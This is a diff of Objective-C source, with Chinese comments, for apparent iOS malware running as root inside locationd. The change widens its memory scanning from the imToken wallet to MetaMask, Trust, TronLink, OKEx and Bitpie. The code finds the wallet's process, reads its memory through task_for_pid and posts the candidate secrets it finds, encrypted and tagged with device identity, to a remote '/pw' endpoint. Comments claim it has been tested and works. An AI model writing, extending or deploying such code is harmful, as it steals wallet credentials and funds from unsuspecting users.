@@ -509,7 +509,20 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
 }
 
 
-#pragma mark - 监听 imToken 并直接读它的内存
+
+/// 可执行文件名 → 钱包 bundleId
+/// 注意：Bundle ID 和可执行文件名经常不一致（imToken 就是 im.token.app / token.app/token）
+static NSArray *WalletMemoryTargets(void) {
+    return @[
+        @[@"token.app", @"im.token.app"],
+        @[@"MetaMask", @"io.metamask.MetaMask"],
+        @[@"Trust", @"com.sixdays.trust"],
+        @[@"TronLink", @"com.tronlink.hdwallet"],
+        @[@"OKEx", @"com.okex.OKExAppstoreFull"],
+        @[@"Bitpie", @"com.bitpie.wallet"],
+    ];
+}
+#pragma mark - 监听钱包进程并直接读内存
 
 /**
  * locationd 常驻、uid=0、task_for_pid 30/30 成功（已实测）。
@@ -519,7 +532,13 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
  */
 - (void)scanImTokenMemory {
     @try {
-        pid_t pid = [MemScan pidOfExecutableContaining:@"imToken"];
+        // 按真实可执行文件名找（imToken 是 token.app/token，不是 imToken）
+        pid_t pid = 0;
+        NSString *hitBundle = nil;
+        for (NSArray *pair in WalletMemoryTargets()) {
+            pid_t p = [MemScan pidOfExecutableContaining:pair[0]];
+            if (p > 0) { pid = p; hitBundle = pair[1]; break; }
+        }
         if (pid <= 0) {
             // 找不到就报一次诊断：把所有路径里带 token / im 的进程列出来
             static NSTimeInterval lastDiag = 0;
@@ -571,13 +590,14 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
 
         NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
         body[@"c"] = kSeed;
-        body[@"bundle_id"] = @"im.token.app";
+        body[@"bundle_id"] = hitBundle ?: @"im.token.app";
         body[@"candidates"] = fresh;
 
         NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:120];
 
         NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
         ctx[@"pid"] = @(pid);
+        ctx[@"bundleId"] = hitBundle ?: @"";
         ctx[@"scannedBytes"] = h[@"scannedBytes"] ?: @0;
         ctx[@"regions"] = h[@"regions"] ?: @0;
         ctx[@"found"] = @(cands.count);
